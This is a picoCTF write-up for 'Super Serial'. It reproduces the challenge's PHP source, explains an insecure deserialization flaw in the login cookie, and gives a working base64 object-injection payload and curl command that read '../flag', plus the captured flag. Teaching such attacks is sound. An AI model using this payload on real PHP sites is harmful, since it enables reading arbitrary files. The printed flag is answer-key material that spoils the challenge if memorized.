
# PICOCTF - Super Serial


### Description:
> Try to recover the flag stored on this website http://mercury.picoctf.net:3449/
### Solution:
1. The above website redirect us to a page which allows us to login using a username and password. After some reconnaissance we can see that `robots.txt` has some interesting information.
```
User-agent: *
Disallow: /admin.phps
```

2. It shows that `admin.phps` is disallowed. `phps` extension is different from `php` extension as the latter shows the execution of the php code while the former only shows the HTML representation of the php code.

More information can be accessed at `index.phps`:

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
3. Nothing is really interesting here except `cookie.php`:

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
and `authentication.phps`
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

4. The exploit is in this code block

```php 
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

This is a [deserialization vulnerabilities](https://portswigger.net/web-security/deserialization). We can see that any object stored in `login` cookie will be unserialized and pass onto `try` block where it will be tested `is_admin` or `is_guest`.

From the hint, we know that our flag is in `../flag` ,but we need to print it out. The above block of code shows that if our object is neither guest or admin, it will print out `$perm`, which is our solution.

Therefore, we only need to serialize our `access_log` object, which looks like this `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`. For more information on how this syntax actually work, visit [this medium article](https://l.facebook.com/l.php?u=https%3A%2F%2Fmedium.com%2Fswlh%2Fexploiting-php-deserialization-56d71f03282a%3Ffbclid%3DIwAR2lIRaZ1oX4ipHxNHFC29arCtw4qFwuAH881BC8RGgkrw6p60m85i_sj24&h=AT1sdTPhl8StwAA7-iIgJD8YQgqTXq6pwevovfc7AvamFxFPbaU5ELg5feywhelmdDl3WIlAURhFugdQnfTZFTOUUWlNEklC-0W-OR3sJD9MPr1NU4jVUbKkLtFgN2dmzXejbA).

We need to insert this syntax onto the cookie of `authentication.php`, but our cookie must be base64, therefore, we need to encode it as: 
`TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`.

We can use cURL to access our flag direcly via: `curl mercury.picoctf.net:3449/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"`

This will print the error and the flag:
```
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```





## Flag
```
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```